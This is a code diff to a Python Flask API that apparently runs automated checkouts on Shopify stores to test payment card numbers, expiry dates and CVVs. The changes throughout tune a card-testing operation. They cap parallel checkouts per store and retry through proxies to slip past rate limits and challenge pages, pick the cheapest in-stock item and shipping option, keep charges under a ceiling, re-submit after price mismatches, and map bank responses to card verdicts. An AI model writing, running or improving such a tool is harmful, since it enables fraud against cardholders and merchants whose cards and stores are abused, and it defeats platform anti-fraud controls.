StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}
 
 """
@@ -302,6 +319,81 @@ async def tokenize_card_multi(session, payload, headers, proxy_str):
     return None
 
 
+# ── Connection layer ───────────────────────────────────────────────────────
+# The old code built a brand-new TCPConnector per request with limit=0 and
+# force_close=True. Under 150+ concurrent checks that exhausts sockets/FDs and
+# aiohttp starts raising bare "keepalive_timeout" errors that leaked out as the
+# card verdict. Bounded pools + a hard in-flight cap fix that.
+_MAX_INFLIGHT_CHECKS = int(os.environ.get("API_MAX_INFLIGHT", "200"))
+_check_sem = None
+
+
+def _new_connector():
+    return aiohttp.TCPConnector(
+        ssl=False,
+        limit=_MAX_INFLIGHT_CHECKS * 4,
+        limit_per_host=0,
+        ttl_dns_cache=300,
+        keepalive_timeout=15,
+        force_close=False,
+        enable_cleanup_closed=True,
+    )
+
+
+def _get_check_sem():
+    global _check_sem
+    if _check_sem is None:
+        _check_sem = asyncio.Semaphore(_MAX_INFLIGHT_CHECKS)
+    return _check_sem
+
+
+# ── Per-store concurrency cap ──────────────────────────────────────────────
+# Hitting the same Shopify shop with 100+ parallel checkouts is what triggers
+# the "Verifying your connection..." challenge page / 429 flood. Shopify only
+# rate-limits per shop domain, so a small per-host gate kills that entirely
+# without slowing the overall run (other stores keep going full speed).
+_MAX_INFLIGHT_PER_HOST = int(os.environ.get("API_MAX_PER_HOST", "2"))
+_host_sems: dict = {}
+
+
+def _host_of(site_url) -> str:
+    try:
+        s = str(site_url or "").strip().lower()
+        s = s.split("://", 1)[-1]
+        return s.split("/", 1)[0].split("?", 1)[0]
+    except Exception:
+        return "unknown"
+
+
+def _get_host_sem(site_url):
+    h = _host_of(site_url)
+    sem = _host_sems.get(h)
+    if sem is None:
+        sem = asyncio.Semaphore(_MAX_INFLIGHT_PER_HOST)
+        _host_sems[h] = sem
+    return sem
+
+
+
+
+# Transport-level failures that are OUR fault (node overloaded / proxy dead),
+# never the store's. They must never be reported as a card or site verdict.
+_INFRA_ERROR_MARKERS = (
+    "keepalive_timeout", "server disconnected", "connection reset",
+    "connection closed", "too many open files", "cannot connect to host",
+    "connector is closed", "session is closed", "event loop is closed",
+    "connection pool", "timeout context manager", "ssl handshake",
+    "proxy connection", "407", "tunnel connection failed",
+    "rate_limited", "rate limited", "http=429", "http=403", "http=503",
+    "html/challenge page", "empty body",
+)
+
+
+def _is_infra_error(msg) -> bool:
+    m = str(msg or "").lower()
+    return any(k in m for k in _INFRA_ERROR_MARKERS)
+
+
 # ── Fast site-health check (products.json only, ~1 request) ────────────────
 async def check_site_fast(site_url, proxy_str=None, min_price=0.50, max_price=40.0):
     """Return dict {ok, price, product, error} — no checkout, ~1 request."""
@@ -317,9 +409,7 @@ async def check_site_fast(site_url, proxy_str=None, min_price=0.50, max_price=40
         "Accept-Language": "en-US,en;q=0.9",
     }
     try:
-        connector = aiohttp.TCPConnector(ssl=False, limit=0, limit_per_host=0,
-                                        ttl_dns_cache=300, keepalive_timeout=5, force_close=True,
-                                        enable_cleanup_closed=True)
+        connector = _new_connector()
         timeout = aiohttp.ClientTimeout(total=12)
         async with aiohttp.ClientSession(connector=connector, timeout=timeout) as sess:
             r = await sess.get(site_url + "/products.json?limit=250",
@@ -407,13 +497,21 @@ async def make_graphql_request_with_captcha_handling(
 _recent_prices = {}
 
 def _pick_variant(candidates, domain):
-    """Prefer a variant whose price hasn't been used on this domain recently."""
+    """Cheapest-first pick, with light rotation among the cheapest few only.
+
+    The old version chose at RANDOM out of every in-range variant, so a store
+    with items from $1 to $5 could just as easily get billed the $5 one.
+    """
     if len(candidates) <= 1:
         return candidates[0]
+    # no-shipping variants first, then cheapest — shipping is what breaks the cap
+    ordered = sorted(candidates, key=lambda v: (bool(v.get("ship", True)),
+                                                v.get("price_f", 9e9)))
+    pool = ordered[:3]                       # only the three cheapest
     recent = _recent_prices.get(domain, [])
-    preferred = [v for v in candidates if v["price"] not in recent] or candidates
-    pick = random.choice(preferred)
-    _recent_prices[domain] = (recent + [pick["price"]])[-5:]
+    preferred = [v for v in pool if v["price"] not in recent] or pool
+    pick = preferred[0] if len(preferred) == 1 else random.choice(preferred)
+    _recent_prices[domain] = (recent + [pick["price"]])[-3:]
     return pick
 
 async def fetch_products(domain, proxy_str=None, min_price=0.50, max_price=5.00):
@@ -426,6 +524,9 @@ async def fetch_products(domain, proxy_str=None, min_price=0.50, max_price=5.00)
       • Rotates variant selection per-domain to avoid repeated-price flagging
     """
     RETRYABLE = {400, 408, 425, 429, 500, 502, 503, 504}
+    _SKIP_PRODUCT_WORDS = ("gift", "e-gift", "giftcard", "donation", "donate",
+                           "tip ", "tips", "shipping", "warranty", "protection",
+                           "bundle", "mystery", "deposit", "sample", "insurance")
     try:
         if not domain.startswith('http'):
             domain = "https://" + domain
@@ -433,9 +534,7 @@ async def fetch_products(domain, proxy_str=None, min_price=0.50, max_price=5.00)
         proxy = parse_proxy(proxy_str) if proxy_str else None
         host = urlparse(domain).hostname or domain
 
-        connector = aiohttp.TCPConnector(ssl=False, limit=0, limit_per_host=0,
-                                        ttl_dns_cache=300, keepalive_timeout=5, force_close=True,
-                                        enable_cleanup_closed=True)
+        connector = _new_connector()
         timeout   = aiohttp.ClientTimeout(total=12)
         ua, ch, platform = ua_pair()
         headers = {"User-Agent": ua, "Accept": "application/json,text/plain,*/*",
@@ -443,41 +542,66 @@ async def fetch_products(domain, proxy_str=None, min_price=0.50, max_price=5.00)
 
         text = None
         last_err = None
+        result = []
         async with aiohttp.ClientSession(connector=connector, timeout=timeout, headers=headers) as session:
-            for attempt in range(1, 4):
-                try:
-                    async with session.get(f"{domain}/products.json?limit=250",
-                                           proxy=proxy, timeout=12) as resp:
-                        if resp.status == 200:
-                            text = await resp.text()
+            # Walk up to 3 catalog pages — the cheapest item is very often NOT on
+            # page 1 (page 1 is usually the featured / expensive collection).
+            for page in range(1, 4):
+                page_text = None
+                for attempt in range(1, 4):
+                    try:
+                        async with session.get(f"{domain}/products.json?limit=250&page={page}",
+                                               proxy=proxy, timeout=12) as resp:
+                            if resp.status == 200:
+                                page_text = await resp.text()
+                                break
+                            if resp.status in RETRYABLE:
+                                last_err = f"HTTP {resp.status}"
+                                await asyncio.sleep(1.5 + random.random() * 1.5)
+                                continue
+                            if page == 1:
+                                return False, f"<b>Site Error! Status: {resp.status}</b>"
+                            page_text = None
                             break
-                        if resp.status in RETRYABLE:
-                            last_err = f"HTTP {resp.status}"
-                            await asyncio.sleep(1.5 + random.random() * 1.5)
-                            continue
-                        return False, f"<b>Site Error! Status: {resp.status}</b>"
-                except (aiohttp.ClientError, asyncio.TimeoutError) as e:
-                    last_err = str(e)
-                    if attempt < 3:
-                        await asyncio.sleep(1 + random.random())
-                    continue
+                    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
+                        last_err = str(e)
+                        if attempt < 3:
+                            await asyncio.sleep(1 + random.random())
+                        continue
 
-        if not text:
+                if not page_text:
+                    break
+                if page == 1:
+                    text = page_text
+                    if "shopify" not in page_text.lower():
+                        return False, "<b>Not Shopify!</b>"
+                try:
+                    page_products = json.loads(page_text).get("products", [])
+                except Exception:
+                    if page == 1:
+                        return False, "<b>Invalid products.json</b>"
+                    break
+                if not page_products:
+                    break
+                result.extend(page_products)
+
+        if text is None:
             return False, f"<b>Proxy/Site Error: {last_err or 'no response'}</b>"
-
-        if "shopify" not in text.lower():
-            return False, "<b>Not Shopify!</b>"
-
-        try:
-            result = json.loads(text).get("products", [])
-        except Exception:
-            return False, "<b>Invalid products.json</b>"
         if not result:
             return False, "<b>No Products!</b>"
 
         in_range = []
         fallback = []
         for product in result:
+            # Skip junk "cheap" listings — a $1 gift card / donation / tip / shipping
+            # fee is not a real purchase and Shopify handles them differently
+            # (price mismatch, no delivery, instant reject).
+            _title = str(product.get("title", "")).lower()
+            _ptype = str(product.get("product_type", "")).lower()
+            if any(w in _title for w in _SKIP_PRODUCT_WORDS):
+                continue
+            if _ptype in ("gift card", "gift_card", "service", "donation"):
+                continue
             for variant in product.get("variants", []):
                 if variant.get("available") is False:
                     continue
@@ -495,18 +619,26 @@ async def fetch_products(domain, proxy_str=None, min_price=0.50, max_price=5.00)
                     "price":      f"{price_f:.2f}",
                     "price_f":    price_f,
                     "variant_id": str(variant["id"]),
+                    "ship":       bool(variant.get("requires_shipping", True)),
                     "link":       f"{domain}/products/{product.get('handle','')}",
                 }
                 if price_f <= max_price:
                     in_range.append(entry)
                 fallback.append(entry)
 
-        fallback.sort(key=lambda x: x["price_f"])
-        candidates = in_range if in_range else fallback
-        if not candidates:
+        # HARD cap — never fall back to items above max_price. A store that
+        # only stocks $20+ items must be skipped, not billed at $27/$45.
+        if not in_range:
+            if fallback:
+                fallback.sort(key=lambda x: x["price_f"])
+                cheapest = fallback[0]["price_f"]
+                return False, f"<b>NO_LOW_VARIANT (cheapest ${cheapest:.2f} > ${max_price:.2f})</b>"
             return False, "<b>No Valid Products</b>"
+        candidates = in_range
 
         pick = _pick_variant(candidates, host)
+        if float(pick.get("price_f", 9e9)) > max_price + 0.001:
+            return False, f"<b>NO_LOW_VARIANT (picked ${pick['price']} > ${max_price:.2f})</b>"
         return {"site": pick["site"], "price": pick["price"],
                 "variant_id": pick["variant_id"], "link": pick["link"]}
 
@@ -532,12 +664,32 @@ _SHOPIFY_ERROR_MAP = {
     "inventory": "OUT_OF_STOCK", "out of stock": "OUT_OF_STOCK",
     "captcha": "CAPTCHA_REQUIRED", "terms": "TERMS_REQUIRED",
     "brand": "CARD_BRAND_NOT_SUPPORTED",
+    # extra bank verdicts — these are real card answers, not store faults
+    "call issuer": "CALL_ISSUER", "call_issuer": "CALL_ISSUER",
+    "restricted card": "RESTRICTED_CARD", "restricted_card": "RESTRICTED_CARD",
+    "not enough funds": "INSUFFICIENT_FUNDS", "not_enough_funds": "INSUFFICIENT_FUNDS",
+    "low balance": "INSUFFICIENT_FUNDS",
+    "authentication required": "AUTHENTICATION_REQUIRED",
+    "3d secure": "AUTHENTICATION_REQUIRED", "3ds": "AUTHENTICATION_REQUIRED",
+    "sca required": "AUTHENTICATION_REQUIRED",
+    "duplicate transaction": "DUPLICATE_TRANSACTION",
+    "reenter transaction": "REENTER_TRANSACTION",
+    "try again later": "TRY_AGAIN_LATER",
+    "withdrawal": "WITHDRAWAL_LIMIT_EXCEEDED",
+    "currency": "CURRENCY_NOT_SUPPORTED",
+    "generic decline": "CARD_DECLINED", "generic_decline": "CARD_DECLINED",
+    "transaction not permitted": "CARD_DECLINED",
+    "invalid account": "CARD_INVALID",
 }
 
 def extract_clean_response(message):
     if not message:
         return "UNKNOWN_ERROR"
     message = str(message)
+
+    # Node-side transport failure — flag it so the bot never blames the store
+    if _is_infra_error(message):
+        return "INFRA_ERROR"
 
     # Structured code patterns (existing behaviour, kept intact)
     patterns = [
@@ -574,7 +726,8 @@ def extract_clean_response(message):
 
 
 async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None,
-                       country_override=None, min_price=0.50, max_price=5.00):
+                       country_override=None, min_price=0.50, max_price=5.00,
+                       max_total=None):
     gateway = "UNKNOWN"
     total_price = "0.00"
     currency = "USD"
@@ -620,12 +773,15 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
         if not variant_id:
             info = await fetch_products(ourl, proxy_str, min_price, max_price)
             if isinstance(info, tuple) and info[0] is False:
+                _dbg(ourl, f"catalog read failed — {info[1]}")
                 return False, info[1], gateway, total_price, currency
             variant_id = info['variant_id']
+            _dbg(ourl, f"api picked item ${info.get('price')} "
+                       f"(variant {variant_id}) — range ${min_price}-${max_price}")
+        else:
+            _dbg(ourl, f"using bot-picked variant {variant_id}")
 
-        connector = aiohttp.TCPConnector(ssl=False, limit=0, limit_per_host=0,
-                                        ttl_dns_cache=300, keepalive_timeout=5, force_close=True,
-                                        enable_cleanup_closed=True)
+        connector = _new_connector()
         timeout = aiohttp.ClientTimeout(total=30)
         
         async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
@@ -850,15 +1006,36 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     await asyncio.sleep(3)
             
             if not response:
+                _dbg(ourl, f"proposal request FAILED — {str(resp_text)[:200]}")
                 return False, f"Request failed: {resp_text}", gateway, total_price, currency
             
             if is_captcha_required(resp_text):
+                _dbg(ourl, "proposal blocked — CAPTCHA wall")
                 return False, "CAPTCHA_REQUIRED", gateway, total_price, currency
             
             try:
                 resp_json = json.loads(resp_text)
             except json.JSONDecodeError as e:
-                return False, f"Invalid JSON response: {str(e)}", gateway, total_price, currency
+                # Shopify handed back HTML / an empty body instead of JSON.
+                # Show exactly what came back so the cause is visible.
+                _body = (str(resp_text) or "").strip()
+                _st = getattr(response, "status", "?")
+                _kind = ("EMPTY BODY" if not _body
+                         else "HTML/CHALLENGE PAGE" if _body[:1] == "<"
+                         else "UNEXPECTED TEXT")
+                _dbg(ourl, f"proposal NOT JSON — http={_st} len={len(_body)} "
+                           f"kind={_kind} | body[:200]={_body[:200]!r}")
+                # 429 / 403 / 5xx / challenge wall = we got blocked, NOT a bad store
+                try:
+                    _stn = int(_st)
+                except Exception:
+                    _stn = 0
+                if _stn in (401, 402, 403, 407, 408, 429, 500, 502, 503, 504) or _kind != "UNEXPECTED TEXT":
+                    return (False, f"RATE_LIMITED (http={_st} {_kind})",
+                            gateway, total_price, currency)
+                return (False,
+                        f"Invalid JSON response: http={_st} {_kind} :: {_body[:120]}",
+                        gateway, total_price, currency)
 
             if 'errors' in resp_json:
                 errors = resp_json.get('errors', [])
@@ -922,11 +1099,27 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 if delivery_lines and len(delivery_lines) > 0:
                     available_strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
                     if available_strategies and len(available_strategies) > 0:
-                        delivery_strategy = available_strategies[0].get('handle', '')
-                        shipping_amount_data = available_strategies[0].get('amount', {}).get('value', {}).get('amount', '0')
+                        # ALWAYS take the cheapest shipping option.  Shopify lists
+                        # express/priority first on many stores — blindly taking
+                        # [0] is how a $3 item turned into a $27 order.
+                        def _strat_cost(s):
+                            try:
+                                return float(s.get('amount', {}).get('value', {}).get('amount', 0) or 0)
+                            except Exception:
+                                return 9e9
+                        cheapest = min(available_strategies, key=_strat_cost)
                         try:
-                            shipping_amount = float(shipping_amount_data)
+                            _dbg(ourl, "shipping options: " + ", ".join(
+                                f"{(s.get('title') or s.get('handle') or '?')[:28]}=${_strat_cost(s):.2f}"
+                                for s in available_strategies[:6]))
+                        except Exception:
+                            pass
+                        delivery_strategy = cheapest.get('handle', '')
+                        try:
+                            shipping_amount = float(_strat_cost(cheapest))
                         except:
+                            shipping_amount = 0.0
+                        if shipping_amount >= 9e8:
                             shipping_amount = 0.0
                     else:
                         delivery_strategy = ''
@@ -964,6 +1157,24 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             
             if not payment_identifier:
                 return False, "No valid payment method found", gateway, total_price, currency
+
+            # ── Hard charge ceiling ───────────────────────────────────────────
+            # item price alone is not the charge: shipping + tax can turn a
+            # $3 item into a $27 order.  Abort BEFORE submitting payment.
+            _dbg(ourl, f"totals → item={running_total} ship={shipping_amount:.2f} "
+                       f"tax={tax_amount:.2f} total={total_price} {currency} "
+                       f"| cap={max_total or '-'} | gateway={gateway}")
+            if max_total:
+                try:
+                    _tp = float(total_price)
+                except Exception:
+                    _tp = 0.0
+                if _tp > float(max_total) + 0.001:
+                    _dbg(ourl, f"OVER CAP — total {_tp:.2f} {currency} > cap {max_total} "
+                               f"(item {running_total} + ship {shipping_amount:.2f} "
+                               f"+ tax {tax_amount:.2f}) → skipping store")
+                    return (False, f"TOTAL_OVER_CAP {_tp:.2f}",
+                            gateway, total_price, currency)
             
             json_data['query'] = QUERY_PROPOSAL_DELIVERY
             json_data['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {
@@ -1166,52 +1377,126 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 'operationName': 'SubmitForCompletion'
             }
 
-            response, text, captcha_solved = await make_graphql_request_with_captcha_handling(
-                session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=1
+            # Codes that mean "the cart moved under us" — Shopify hands back the
+            # corrected amount, so patch it in and re-submit instead of burning
+            # the card as a dead store error.
+            _RENEG_CODES = (
+                'MERCHANDISE_EXPECTED_PRICE_MISMATCH',
+                'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED',
+                'DELIVERY_EXPECTED_PRICE_MISMATCH',
+                'WAITING_PENDING_TERMS',
+                'PENDING_TERM_VIOLATION',
+                'TAX_EXPECTED_TOTAL_AMOUNT_MISMATCH',
             )
-            
-            if is_captcha_required(text):
-                return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency
-            
-            if "Your order total has changed." in text:
-                return False, "Site not supported", gateway, total_price, currency
-            if "The requested payment method is not available." in text:
-                return False, "Payment method not available", gateway, total_price, currency
-            
-            try:
-                resp_json = json.loads(text)
-                submit_data = resp_json.get('data', {}).get('submitForCompletion', {})
-                
-                if not submit_data:
-                    errors = resp_json.get('errors', [])
-                    if errors:
-                        for error in errors:
-                            code = error.get('code')
-                            if code:
-                                return False, code, gateway, total_price, currency
-                    return False, "Empty submit response", gateway, total_price, currency
-                
-                result_type = submit_data.get('__typename', '')
-                
-                if result_type in ['SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted']:
-                    receipt = submit_data.get('receipt', {})
-                    if receipt:
-                        receipt_type = receipt.get('__typename', '')
-                        
-                        if receipt_type == 'ProcessedReceipt':
-                            return True, "ORDER_PLACED", gateway, total_price, currency
-                        
-                        rid = receipt.get('id')
-                    else:
+
+            def _err_new_amount(err):
+                """Read the corrected amount Shopify suggests in an ApplyChangeViolation."""
+                to = err.get('to') or {}
+                val = to.get('value')
+                if val is None:
+                    return None
+                try:
+                    return f"{float(str(val).replace(',', '')):.2f}"
+                except Exception:
+                    return None
+
+            rid = None
+            _submit_ok = False
+            for _sub_try in range(3):
+                response, text, captcha_solved = await make_graphql_request_with_captcha_handling(
+                    session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=1
+                )
+
+                if is_captcha_required(text):
+                    return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency
+
+                if "Your order total has changed." in text:
+                    return False, "Site not supported", gateway, total_price, currency
+                if "The requested payment method is not available." in text:
+                    return False, "Payment method not available", gateway, total_price, currency
+
+                try:
+                    resp_json = json.loads(text)
+                    submit_data = resp_json.get('data', {}).get('submitForCompletion', {})
+
+                    if not submit_data:
+                        errors = resp_json.get('errors', [])
+                        if errors:
+                            for error in errors:
+                                code = error.get('code')
+                                if code:
+                                    return False, code, gateway, total_price, currency
+                        return False, "Empty submit response", gateway, total_price, currency
+
+                    result_type = submit_data.get('__typename', '')
+
+                    if result_type in ['SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted']:
+                        receipt = submit_data.get('receipt', {})
+                        if receipt:
+                            receipt_type = receipt.get('__typename', '')
+
+                            if receipt_type == 'ProcessedReceipt':
+                                return True, "ORDER_PLACED", gateway, total_price, currency
+
+                            rid = receipt.get('id')
+                            _submit_ok = True
+                            break
                         return False, "SubmitSuccess but no receipt", gateway, total_price, currency
-                
-                elif result_type == 'SubmitFailed':
-                    reason = submit_data.get('reason', 'Unknown reason')
-                    return False, extract_clean_response(reason), gateway, total_price, currency
-                
-                elif result_type == 'SubmitRejected':
-                    errors = submit_data.get('errors', [])
-                    if errors:
+
+                    elif result_type == 'SubmitFailed':
+                        reason = submit_data.get('reason', 'Unknown reason')
+                        return False, extract_clean_response(reason), gateway, total_price, currency
+
+                    elif result_type == 'SubmitRejected':
+                        errors = submit_data.get('errors', []) or []
+                        codes = [str(e.get('code', '') or '').upper() for e in errors]
+
+                        # cart/shipping/tax drifted → correct it and try again
+                        if _sub_try < 2 and any(c in _RENEG_CODES for c in codes):
+                            _patched = False
+                            _sv = submit_variables['input']
+                            for err in errors:
+                                c = str(err.get('code', '') or '').upper()
+                                new_amt = _err_new_amount(err)
+                                if not new_amt:
+                                    continue
+                                if c.startswith('MERCHANDISE'):
+                                    _sv['merchandise']['merchandiseLines'][0]['expectedTotalPrice']['value']['amount'] = new_amt
+                                    _sv['payment']['paymentLines'][0]['amount']['value']['amount'] = new_amt
+                                    running_total = new_amt
+                                    subtotal = new_amt
+                                    _patched = True
+                                elif c.startswith('DELIVERY'):
+                                    _sv['delivery']['deliveryLines'][0]['expectedTotalPrice']['value']['amount'] = new_amt
+                                    shipping_amount = float(new_amt)
+                                    _patched = True
+                                elif c.startswith('TAX'):
+                                    _sv['taxes']['proposedTotalAmount']['value']['amount'] = new_amt
+                                    tax_amount = float(new_amt)
+                                    _patched = True
+
+                            # never let a re-negotiation push us past the price ceiling
+                            if max_total:
+                                try:
+                                    _new_total = float(running_total) + float(shipping_amount) + float(tax_amount)
+                                except Exception:
+                                    _new_total = 0.0
+                                if _new_total > float(max_total) + 0.001:
+                                    _dbg(ourl, f"re-negotiated total {_new_total:.2f} > cap {max_total} → skipping store")
+                                    return (False, f"TOTAL_OVER_CAP {_new_total:.2f}",
+                                            gateway, total_price, currency)
+                                total_price = f"{_new_total:.2f}"
+
+                            _dbg(ourl, f"submit rejected {codes} → re-negotiating "
+                                       f"({'patched amounts' if _patched else 'retry'}) "
+                                       f"attempt {_sub_try + 2}/3")
+                            new_queue = submit_data.get('queueToken')
+                            if new_queue:
+                                submit_variables['input']['queueToken'] = new_queue
+                            submit_json_data['variables'] = submit_variables
+                            await asyncio.sleep(1.2)
+                            continue
+
                         for error in errors:
                             code = error.get('code', '')
                             localized_msg = error.get('localizedMessage', '')
@@ -1223,23 +1508,31 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                     return False, detail, gateway, total_price, currency
                             if code:
                                 return False, code, gateway, total_price, currency
-                    return False, "Submit Rejected", gateway, total_price, currency
-                
-                elif result_type == 'Throttled':
-                    return False, "Throttled", gateway, total_price, currency
-                
-                receipt = submit_data.get('receipt', {})
-                if not receipt:
-                    return False, "No receipt in submit response", gateway, total_price, currency
-                
-                rid = receipt.get('id')
-                if not rid:
-                    return False, "No receipt ID", gateway, total_price, currency
-                
-            except json.JSONDecodeError:
-                return False, f"Invalid JSON in submit response: {text[:100]}", gateway, total_price, currency
-            except Exception as e:
-                return False, f"Error parsing submit: {str(e)}", gateway, total_price, currency
+                        return False, "Submit Rejected", gateway, total_price, currency
+
+                    elif result_type == 'Throttled':
+                        if _sub_try < 2:
+                            await asyncio.sleep(2)
+                            continue
+                        return False, "Throttled", gateway, total_price, currency
+
+                    receipt = submit_data.get('receipt', {})
+                    if not receipt:
+                        return False, "No receipt in submit response", gateway, total_price, currency
+
+                    rid = receipt.get('id')
+                    if not rid:
+                        return False, "No receipt ID", gateway, total_price, currency
+                    _submit_ok = True
+                    break
+
+                except json.JSONDecodeError:
+                    return False, f"Invalid JSON in submit response: {text[:100]}", gateway, total_price, currency
+                except Exception as e:
+                    return False, f"Error parsing submit: {str(e)}", gateway, total_price, currency
+
+            if not _submit_ok or not rid:
+                return False, "Submit Rejected", gateway, total_price, currency
 
             params = {'operationName': 'PollForReceipt'}
             poll_json_data = {
@@ -1355,7 +1648,7 @@ def _is_retryable(message):
     return any(m in low for m in RETRYABLE_MARKERS)
 
 async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None,
-                             low=True, country=None, retries=1):
+                             low=True, country=None, retries=1, max_total=None):
     """Run a check, with automatic shipping-country fallback.
 
     Ported from the VXO engine: if the store refuses the first address
@@ -1366,7 +1659,8 @@ async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy
 
     result = await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str,
                                 country_override=country,
-                                min_price=min_price, max_price=max_price)
+                                min_price=min_price, max_price=max_price,
+                                max_total=max_total)
     success, message = result[0], result[1]
 
     tried = (country or "").upper()
@@ -1385,7 +1679,8 @@ async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy
         await asyncio.sleep(0.5 + random.random())
         result = await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str,
                                     country_override=next_country,
-                                    min_price=min_price, max_price=max_price)
+                                    min_price=min_price, max_price=max_price,
+                                    max_total=max_total)
         success, message = result[0], result[1]
 
     return result
@@ -1416,13 +1711,52 @@ def run_async(coro, timeout=75):
 
 app = Flask(__name__)
 
-def _do_check(site, cc_string, proxy_str, variant_id, low, country):
+async def _guarded_check(*a, **kw):
+    """Run the check behind a hard in-flight cap AND a per-store cap so the node
+    degrades instead of melting its socket pool, and Shopify never sees a burst
+    of parallel checkouts from one shop. Transport/rate-limit failures are
+    retried once (fresh session) before we ever report them."""
+    site = a[4] if len(a) > 4 else kw.get("site_url")
+    last = None
+    async with _get_check_sem():
+        async with _get_host_sem(site):
+            for attempt in range(2):
+                try:
+                    res = await process_card_async(*a, **kw)
+                except Exception as e:
+                    if not _is_infra_error(e):
+                        raise
+                    last = (False, "INFRA_ERROR", "UNKNOWN", "0.00", "USD")
+                else:
+                    # a real verdict (or a real store answer) → done
+                    if not _is_infra_error(res[1] if len(res) > 1 else ""):
+                        return res
+                    last = res
+                if attempt == 0:
+                    # small jittered pause lets the shop's rate window reset
+                    await asyncio.sleep(1.5 + random.random() * 2.0)
+    return last or (False, "INFRA_ERROR", "UNKNOWN", "0.00", "USD")
+
+
+
+def _do_check(site, cc_string, proxy_str, variant_id, low, country, max_total=None):
     cc_parts = parse_cc_string(cc_string)
     started = time.time()
-    success, message, gateway, price, currency = run_async(
-        process_card_async(cc_parts['cc'], cc_parts['mes'], cc_parts['ano'], cc_parts['cvv'],
-                           site, variant_id, proxy_str, low=low, country=country)
-    )
+    try:
+        success, message, gateway, price, currency = run_async(
+            _guarded_check(cc_parts['cc'], cc_parts['mes'], cc_parts['ano'], cc_parts['cvv'],
+                           site, variant_id, proxy_str, low=low, country=country,
+                           max_total=max_total)
+        )
+    except Exception as e:
+        # Never let a transport failure escape as a store/card verdict
+        return {
+            "Gateway": "UNKNOWN", "Price": 0.0,
+            "Response": "INFRA_ERROR" if _is_infra_error(e) else "API_TIMEOUT",
+            "Status": False, "cc": cc_string, "Currency": "USD",
+            "Retryable": True, "Raw": str(e)[:300],
+            "Elapsed": round(time.time() - started, 2),
+        }
     clean_response = extract_clean_response(message)
     price_str = str(price)
     return {
@@ -1460,8 +1794,10 @@ def shopify_checker():
         variant_id = request.args.get('variant')
         low        = str(request.args.get('low', 'true')).lower() not in ('0', 'false', 'no')
         country    = request.args.get('country')
+        max_total  = request.args.get('max_total') or request.args.get('cap')
 
-        return jsonify(_do_check(site, cc_string, proxy_str, variant_id, low, country))
+        return jsonify(_do_check(site, cc_string, proxy_str, variant_id, low, country,
+                                 max_total))
 
     except Exception as e:
         return jsonify({
@@ -1496,7 +1832,9 @@ def check_alias():
         except ValueError as e:
             return jsonify({"error": str(e), "status": False}), 400
 
-        return jsonify(_do_check(site, cc_string, proxy_str, variant, low, country))
+        max_total = src('max_total', 'cap')
+        return jsonify(_do_check(site, cc_string, proxy_str, variant, low, country,
+                                 max_total))
     except Exception as e:
         return jsonify({"error": str(e), "status": False,
                         "Response": f"ERROR: {str(e)}"}), 500
